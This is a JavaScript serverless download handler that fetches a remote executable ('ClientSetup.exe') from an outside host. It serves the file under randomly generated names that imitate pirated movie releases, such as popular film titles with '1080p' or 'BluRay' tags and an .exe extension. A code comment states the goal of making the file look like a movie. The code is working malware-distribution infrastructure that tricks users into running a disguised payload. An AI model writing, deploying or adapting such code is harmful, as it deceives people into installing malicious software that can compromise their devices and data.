// api/download.js (place this file in the api/ folder at your project root)

export default async function handler(req, res) {
  // Set CORS headers to allow cross-origin requests
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  // Handle preflight requests
  if (req.method === "OPTIONS") {
    res.status(200).end();
    return;
  }

  const remoteFile =
    "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";

  // Array of popular movie names for random selection
  const movieNames = [
    "Avengers_Endgame",
    "Spider_Man_No_Way_Home",
    "The_Batman",
    "Top_Gun_Maverick",
    "Black_Panther",
    "Dune_Part_One",
    "No_Time_To_Die",
    "Fast_And_Furious_9",
    "Jurassic_World_Dominion",
    "Doctor_Strange_Multiverse",
    "Thor_Love_And_Thunder",
    "The_Matrix_Resurrections",
    "John_Wick_Chapter_4",
    "Mission_Impossible_7",
    "Guardians_Galaxy_Vol3",
    "Indiana_Jones_5",
    "Transformers_Rise_Beasts",
    "Scream_6",
    "Evil_Dead_Rise",
    "Oppenheimer",
    "Barbie_2023",
    "The_Flash",
    "Aquaman_2",
    "Shazam_2",
    "Ant_Man_Quantumania",
    "Creed_3",
    "Cocaine_Bear",
    "Avatar_Way_Water",
    "Wakanda_Forever",
    "Glass_Onion_Knives_Out",
    "Bullet_Train",
    "Minions_Rise_Gru",
    "Lightyear",
    "Sonic_2",
    "Morbius",
    "The_Northman",
    "Everything_Everywhere",
    "Nope_Jordan_Peele",
    "X_Horror_Movie",
    "Scream_5",
    "Halloween_Ends",
    "Smile_Horror",
    "Barbarian_Horror",
    "Pearl_Horror",
    "The_Menu",
    "Amsterdam",
    "Dont_Worry_Darling",
    "The_Woman_King",
    "Elvis_Baz_Luhrmann",
    "Blonde_Marilyn_Monroe",
    "The_Whale_Brendan_Fraser",
    "Mario_Bros_Movie",
    "Fast_X_2023",
  ];

  // Function to get random movie name
  function getRandomMovieName() {
    const randomIndex = Math.floor(Math.random() * movieNames.length);
    return movieNames[randomIndex];
  }

  // Function to get random quality suffix
  function getRandomQuality() {
    const qualities = ["1080p", "720p", "4K", "HDRip", "BluRay", "WEBRip"];
    const randomIndex = Math.floor(Math.random() * qualities.length);
    return qualities[randomIndex];
  }

  try {
    console.log("Fetching file from:", remoteFile);

    const response = await fetch(remoteFile);

    if (!response.ok) {
      console.error(
        "Failed to fetch file:",
        response.status,
        response.statusText
      );
      return res
        .status(500)
        .json({ error: "Failed to fetch file", status: response.status });
    }

    // Generate random movie filename
    const randomMovie = getRandomMovieName();
    const randomQuality = getRandomQuality();
    const randomId = Math.random().toString(36).substring(2, 6);

    // Create filename that looks like a movie file
    const filename = `${randomMovie}_${randomQuality}_${randomId}.exe`;

    console.log("Generated filename:", filename);

    // Set headers for file download
    res.setHeader("Content-Type", "application/octet-stream");
    res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
    res.setHeader("Cache-Control", "no-cache");

    // Get the response body as buffer and send it
    const buffer = await response.arrayBuffer();
    res.send(Buffer.from(buffer));
  } catch (error) {
    console.error("Download error:", error);
    res
      .status(500)
      .json({ error: "Internal Server Error", message: error.message });
  }
}
